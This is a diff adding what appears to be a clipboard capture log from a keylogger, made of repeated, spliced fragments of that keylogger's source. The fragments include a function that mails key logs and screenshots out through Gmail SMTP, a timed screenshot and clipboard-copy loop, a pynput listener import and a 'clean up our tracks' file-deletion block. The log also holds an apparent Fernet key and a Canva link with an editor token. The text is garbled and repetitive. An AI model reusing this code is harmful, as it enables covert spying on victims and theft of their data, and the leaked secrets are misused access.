@@ -1,0 +1,240 @@
+Clipboard Data: 
+  if currentTime > stoppingTime:
+
+            with open(file_path + extend + keys_information, "w") as f:
+                f.write(" ")
+
+            screenshot()
+            send_email(screenshot_information, file_path + extend + screenshot_information, toaddr)
+
+            copy_clipboard()
+
+            number_of_iterations += 1
+
+            currentTime = time.time()
+            stoppingTime = time.time() + time_iterationClipboard Data: 
+  if currentTime > stoppingTime:
+
+            with open(file_path + extend + keys_information, "w") as f:
+                f.write(" ")
+
+            screenshot()
+            send_email(screenshot_information, file_path + extend + screenshot_information, toaddr)
+
+            copy_clipboard()
+
+            number_of_iterations += 1
+
+            currentTime = time.time()
+            stoppingTime = time.time() + time_iterationClipboard Data: 
+  if currentTime > stoppingTime:
+
+            with open(file_path + extend + keys_information, "w") as f:
+                f.write(" ")
+
+            screenshot()
+            send_email(screenshot_information, file_path + extend + screenshot_information, toaddr)
+
+            copy_clipboard()
+
+            number_of_iterations += 1
+
+            currentTime = time.time()
+            stoppingTime = time.time() + time_iterationClipboard Data: 
+# email controls
+def send_email(filename, attachment, toaddr):
+    fromaddr = email_address
+
+    msg = MIMEMultipart()
+    msg['From'] = fromaddr
+
+    msg['To'] = toaddr
+
+    msg['Subject'] = "Log File"
+
+    body = "Body_of_the_mail"
+
+    msg.attach(MIMEText(body, 'plain'))
+
+    filename = filename
+    attachment = open(attachment, 'rb')
+
+    p = MIMEBase('application', 'octet-stream')
+    p.set_payload((attachment).read())
+
+    encoders.encode_base64(p)
+
+    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
+
+    msg.attach(p)
+
+    s = smtplib.SMTP('smtp.gmail.com', 587)
+
+    s.starttls()
+
+    s.login(fromaddr, password)
+
+    text = msg.as_string()
+
+    s.sendmail(fromaddr, toaddr, text)
+
+    s.quit()
+
+send_email(keys_information, file_path + extend + keys_information, toaddr)Clipboard Data: 
+# email controls
+def send_email(filename, attachment, toaddr):
+    fromaddr = email_address
+
+    msg = MIMEMultipart()
+    msg['From'] = fromaddr
+
+    msg['To'] = toaddr
+
+    msg['Subject'] = "Log File"
+
+    body = "Body_of_the_mail"
+
+    msg.attach(MIMEText(body, 'plain'))
+
+    filename = filename
+    attachment = open(attachment, 'rb')
+
+    p = MIMEBase('application', 'octet-stream')
+    p.set_payload((attachment).read())
+
+    encoders.encode_base64(p)
+
+    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
+
+    msg.attach(p)
+
+    s = smtplib.SMTP('smtp.gmail.com', 587)
+
+    s.starttls()
+
+    s.login(fromaddr, password)
+
+    text = msg.as_string()
+
+    s.sendmail(fromaddr, toaddr, text)
+
+    s.quit()
+
+send_email(keys_information, file_path + extend + keys_information, toaddr)
+
+Clipboard Data: 
+# email controls
+def send_email(filename, attachment, toaddr):
+    fromaddr = email_address
+
+    msg = MIMEMultipart()
+    msg['From'] = fromaddr
+
+    msg['To'] = toaddr
+
+    msg['Subject'] = "Log File"
+
+    body = "Body_of_the_mail"
+
+    msg.attach(MIMEText(body, 'plain'))
+
+    filename = filename
+    attachment = open(attachment, 'rb')
+
+    p = MIMEBase('application', 'octet-stream')
+    p.set_payload((attachment).read())
+
+    encoders.encode_base64(p)
+
+    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
+
+    msg.attach(p)
+
+    s = smtplib.SMTP('smtp.gmail.com', 587)
+
+    s.starttls()
+
+    s.login(fromaddr, password)
+
+    text = msg.as_string()
+
+    s.sendmail(fromaddr, toaddr, text)
+
+    s.quit()
+
+send_email(keys_information, file_path + extend + keys_information, toaddr)
+
+Clipboard Data: 
+# email controls
+def send_email(filename, attachment, toaddr):
+    fromaddr = email_address
+
+    msg = MIMEMultipart()
+    msg['From'] = fromaddr
+
+    msg['To'] = toaddr
+
+    msg['Subject'] = "Log File"
+
+    body = "Body_of_the_mail"
+
+    msg.attach(MIMEText(body, 'plain'))
+
+    filename = filename
+    attachment = open(attachment, 'rb')
+
+    p = MIMEBase('application', 'octet-stream')
+    p.set_payload((attachment).read())
+
+    encoders.encode_base64(p)
+
+    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
+
+    msg.attach(p)
+
+    s = smtplib.SMTP('smtp.gmail.com', 587)
+
+    s.starttls()
+
+    s.login(fromaddr, password)
+
+    text = msg.as_string()
+
+    s.sendmail(fromaddr, toaddr, text)
+
+    s.quit()
+
+send_email(keys_information, file_path + extend + keys_information, toaddr)
+
+Clipboard Data: 
+https://www.canva.com/Clipboard Data: 
+https://www.canva.com/Clipboard Data: 
+https://www.canva.com/design/DAEvibcUeNg/share/preview?token=iHnEXl7ym8Ro9udicaZOyQ&role=EDITOR&utm_content=DAEvibcUeNg&utm_campaign=designshare&utm_medium=link&utm_source=sharebuttonClipboard Data: 
+https://www.canva.com/design/DAEvibcUeNg/share/preview?token=iHnEXl7ym8Ro9udicaZOyQ&role=EDITOR&utm_content=DAEvibcUeNg&utm_campaign=designshare&utm_medium=link&utm_source=sharebuttonClipboard Data: 
+from cryptography.fernet import Fernet
+Clipboard Data: 
+from cryptography.fernet import Fernet
+Clipboard Data: 
+from cryptography.fernet import Fernet
+Clipboard Data: 
+Zr_hEiySSvH3oNC2RDkN1NWsqPdTLOoZPA9RF95gbmk=Clipboard Data: 
+
+# Clean up our tracks and delete files
+delete_files = [system_information, clipboard_information, keys_information, screenshot_information, audio_information]
+for file in delete_files:
+    os.remove(file_merge + file)Clipboard Data: 
+
+# Clean up our tracks and delete files
+delete_files = [system_information, clipboard_information, keys_information, screenshot_information, audio_information]
+for file in delete_files:
+    os.remove(file_merge + file)Clipboard could be not be copiedClipboard Data: 
+from pynput.keyboard import Key, ListenerClipboard Data: 
+from pynput.keyboard import Key, ListenerClipboard Data: 
+from pynput.keyboard import Key, ListenerClipboard Data: 
+from pynput.keyboard import Key, ListenerClipboard could be not be copiedClipboard could be not be copiedClipboard Data: 
+MODULE   DESCRIPTIONClipboard Data: 
+MODULE   DESCRIPTIONClipboard Data: 
+MODULE   DESCRIPTIONClipboard Data: 
+MODULE   DESCRIPTIONClipboard Data: 
+The previous retrieval method requires actual physical contact with the target system or the keyloggerClipboard Data: 
+The previous retrieval method requires actual physical contact with the target system or the keyloggerClipboard could be not be copiedClipboard could be not be copiedClipboard could be not be copiedClipboard could be not be copiedClipboard could be not be copiedClipboard could be not be copiedClipboard could be not be copiedClipboard could be not be copiedClipboard could be not be copiedClipboard could be not be copied
